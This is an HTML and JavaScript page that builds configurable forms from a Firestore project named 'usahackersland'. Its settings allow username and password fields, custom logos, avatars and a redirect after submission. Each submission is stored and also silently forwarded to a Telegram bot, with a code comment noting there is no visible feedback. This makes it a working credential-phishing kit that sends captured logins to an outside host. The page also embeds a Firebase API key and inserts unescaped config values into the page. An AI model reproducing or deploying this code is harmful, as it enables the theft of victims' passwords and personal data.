<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Form Submission</title>
<style>
body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: #121212;
  color: #e0e0e0;
  margin: 0;
  padding: 20px;
}
#formContainer {
  max-width: 600px;
  margin: auto;
  background: #1e1e1e;
  padding: 20px;
  border-radius: 12px;
  box-shadow: 0 6px 20px rgba(0,0,0,0.5);
}
h2 {
  text-align: center;
  margin-bottom: 10px;
  color: #00bcd4;
}
#formDesc {
  text-align: center;
  margin-bottom: 20px;
  color: #b0b0b0;
}
input, textarea {
  width: 100%;
  padding: 10px;
  margin: 8px 0;
  border-radius: 6px;
  border: 1px solid #555;
  background: #121212;
  color: #e0e0e0;
  box-sizing: border-box;
}
input::placeholder {
  color: #888;
}
button {
  width: 100%;
  padding: 10px;
  margin-top: 12px;
  border-radius: 6px;
  border: none;
  cursor: pointer;
  font-weight: bold;
  color: #fff;
  background: #1976d2;
  transition: transform 0.1s ease;
}
button:hover {
  transform: scale(1.02);
}
#embedLinks .embedLink {
  margin-top: 6px;
  padding: 6px;
  background: #2a2a2a;
  border-radius: 6px;
  word-break: break-all;
  color: #e0e0e0;
}
#warningMsg {
  color: #f44336;
  font-weight: bold;
  text-align: center;
  margin-bottom: 8px;
}
img.avatar {
  width: 90px;
  border-radius: 50%;
  display: block;
  margin: auto 0 10px auto;
}
img.logo {
  width: 140px;
  display: block;
  margin: auto 0 15px auto;
}
</style>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
</head>
<body>
<div id="formContainer">
<h2 id="formTitle">Loading...</h2>
<div id="formDesc"></div>
<div id="warningMsg"></div>
<form id="dynamicForm"></form>
<div id="embedLinks"></div>
</div>

<script>
const $ = id => document.getElementById(id);
const firebaseConfig = {
  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
  authDomain: "usahackersland.firebaseapp.com",
  projectId: "usahackersland"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

const urlParams = new URLSearchParams(window.location.search);
const formId = urlParams.get("id");
const formEl = $("dynamicForm");
const embedEl = $("embedLinks");
const warningEl = $("warningMsg");

let formConfig = null;

if(!formId){
  $("formTitle").innerText = "Form ID missing!";
}

// Load form config
db.collection("forms").doc(formId).get().then(doc=>{
  if(!doc.exists){
    $("formTitle").innerText = "Form not found!";
    return;
  }
  formConfig = doc.data();
  renderForm();
}).catch(err=>{
  $("formTitle").innerText = "Error loading form";
  console.error(err);
});

// Render the form dynamically
function renderForm(){
  $("formTitle").innerText = formConfig.title;
  $("formTitle").style.color = formConfig.titleColor || "#00bcd4";
  $("formDesc").innerText = formConfig.description || "";
  $("formDesc").style.color = formConfig.textColor || "#b0b0b0";

  formEl.innerHTML = "";

  // Avatar & Logo
  if(formConfig.avatarURL) formEl.innerHTML += `<img src="${formConfig.avatarURL}" class="avatar">`;
  if(formConfig.logoURL) formEl.innerHTML += `<img src="${formConfig.logoURL}" class="logo">`;

  // Warning inside form
  warningEl.innerText = "";

  // Username & Password
  if(formConfig.addAuth){
    formEl.innerHTML += `<input name="username" placeholder="${formConfig.usernamePlaceholder || 'Username'}" required>`;
    formEl.innerHTML += `<input type="password" name="password" placeholder="${formConfig.passwordPlaceholder || 'Password'}" required>`;
  }

  // Extra fields
  formConfig.extraFields.forEach(field=>{
    if(field) formEl.innerHTML += `<input name="${field}" placeholder="${field}" required>`;
  });

  // Embed Links
  embedEl.innerHTML = "";
  formConfig.embedLinks.forEach(link=>{
    if(!link.show) return;
    const div = document.createElement("div");
    div.className = "embedLink";
    div.innerHTML = `<strong>${link.text}</strong>: <a href="${link.url}" target="_blank">${link.url}</a>`;
    if(link.desc) div.innerHTML += `<br><small>${link.desc}</small>`;
    embedEl.appendChild(div);
  });

  // Main Button
  if(formConfig.showMainBtn){
    const btn = document.createElement("button");
    btn.textContent = formConfig.buttonText || "Submit";
    btn.style.background = formConfig.btnColor || "#1976d2";
    btn.onclick = submitForm;
    formEl.appendChild(btn);
  }
}

// Submit Form
function submitForm(e){
  e.preventDefault();
  warningEl.innerText = ""; // reset warning

  const formData = {};
  const inputs = formEl.querySelectorAll("input,textarea");
  inputs.forEach(i=>{
    formData[i.name] = i.value;
  });

  db.collection("submissions").add({
    formId,
    data: formData,
    createdAt: new Date().toISOString()
  }).then(()=>{
    // Redirect if enabled
    if(formConfig.enableRedirect && formConfig.redirectURL){
      setTimeout(()=>window.location.href = formConfig.redirectURL, 500);
    }
    formEl.reset();
  }).catch(err=>{
    console.error(err);
    warningEl.innerText = "âŒ Try again!";
  });

  // Send to Telegram (no UI feedback)
  const telegramMsg = `ðŸ“ New Form Submission\n------------------\n`+
    Object.entries(formData).map(([k,v])=>`ðŸ’  ${k}: ${v}`).join("\n");

  fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({
      chat_id:"YOUR_CHAT_ID",
      text: telegramMsg
    })
  });
}
</script>
</body>
</html>
